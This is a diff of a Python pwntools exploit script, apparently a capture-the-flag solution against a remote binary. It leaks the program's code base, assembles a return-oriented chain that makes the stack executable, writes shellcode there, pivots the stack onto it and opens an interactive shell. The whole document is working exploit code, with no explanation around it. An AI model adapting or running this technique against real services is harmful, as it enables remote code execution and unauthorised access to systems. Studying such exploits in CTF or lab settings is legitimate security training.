@@ -75,15 +75,10 @@ if __name__ == "__main__":
 
     r.settimeout(0.5)
 
-    offset = 56
-    pop_rdi = 0xbc3 # pop rdi; ret
-    pop_rsi = 0xbc1 # pop rsi; pop r15; ret
 
     s('mov r14,[rsp]')
-    print r.recvn(8)
-
-    buf = assemble('dec r14; ret') * (0xb18 - 0x8a2) 
-    r.send(buf)
+    r.recvn(8)
+    r.send( assemble('dec r14; ret') * (0xb18 - 0x8a2) )
     recv_all()
 
     s('push rsp; pop rsi; push r14')
@@ -92,46 +87,54 @@ if __name__ == "__main__":
     l = d[len(d)-6:len(d)] + '\x00\x00'
     l = u64(l)
 
-    CODE_BASE = l - 0x8a2
-    log.info("CODE_BASE: 0x%x" % CODE_BASE)
+    B = l - 0x8a2
+    log.info("code base: 0x%x" % B)
 
-    op = ''
-    op += p64(CODE_BASE + pop_rdi)
-    op += p64(0)
-    op += p64(CODE_BASE + b.plt['alarm'])
-    op += p64(CODE_BASE + 0x8c7)
+    pop_rdi = 0xbc3 # pop rdi; ret
+    pop_rsi = 0xbc1 # pop rsi; pop r15; ret
+    pop_r13 = 0xbbe # pop r13; pop r14; pop r15; ret
+    mov_rdx_r13 = 0xba0 # mov rdx,r13; mov rsi,r14; mov edi,r15d; call qword [r12+rbx*8]
+    pop_rbx = 0xaab # pop rbx; pop r12; pop rbp; ret
 
-    s('push rsp; pop r14; ret')
-    r.send(asm('inc r14;ret') * offset)
-    for x in op:
-        buf = asm('movb [r14], %#x' % ord(x))
-        buf += asm('inc r14; ret')
-        r.send(buf)
-    s('pop rax; pop rdx; push rax; ret')            # stack pivot
+    # mov edx,7
+    # mov esi,0x1000
+    # mov rdi,addr
+    # call mprotect
 
+    offset = 56
     op = ''
     op += mov_r15_retaddr()
-    op += assemble('inc r15') * (0xbc3 - 0xb18)     # 0xbc3: pop rdi;ret
-    op += store_r15(offset) 
-    op += assemble('mov r14, rcx') # rcx is 0x1000
-    op += assemble('push rsp; pop r15')
-    op += assemble('dec r14') # r14 ix 0xfff
-    op += assemble('not r14') # r14 is 1111...1000
-    op += assemble('and r15, r14') # rsp & 1111...1000
+    op += assemble('inc r15') * (0xbc3 - 0xb18)
+    op += store_r15(offset)
+
+    op += movb_r15(0)
     op += store_r15(offset + 0x8)
-    
+
+    op += write_string(offset + 0x10, p64(B + b.plt['alarm']))
+
     op += mov_r15_retaddr()
-    op += assemble('dec r15') * (0xb18 - 0xa20)     # make_page_executable() -> r-x
-    op += store_r15(offset + 0x10)
-    
+    op += assemble('inc r15') * (0xbc3 - 0xb18)
+    op += store_r15(offset + 0x18)
+
+    op += assemble('mov r14,rcx')
+    op += assemble('push rsp; pop r15')
+    op += assemble('dec r14')
+    op += assemble('not r14')
+    op += assemble('and r15,r14')
+    op += store_r15(offset + 0x20)
+
+    op += mov_r15_retaddr()
+    op += assemble('dec r15') * (0xb18 - 0xa20)
+    op += store_r15(offset + 0x28)
+
     op += assemble('push rsp; pop r15')
     op += assemble('inc r15') * (offset + 0x70)
-    op += store_r15(offset + 0x18)
+    op += store_r15(offset + 0x30)
 
     op += write_string(offset + 0x70, adjust_stack + shellcode)
 
     op += movb_r15(offset)
-    op += assemble('add rsp, r15')                  # stack pivot
-    
+    op += assemble('add rsp, r15')
+
     r.send(op)
     r.interactive()
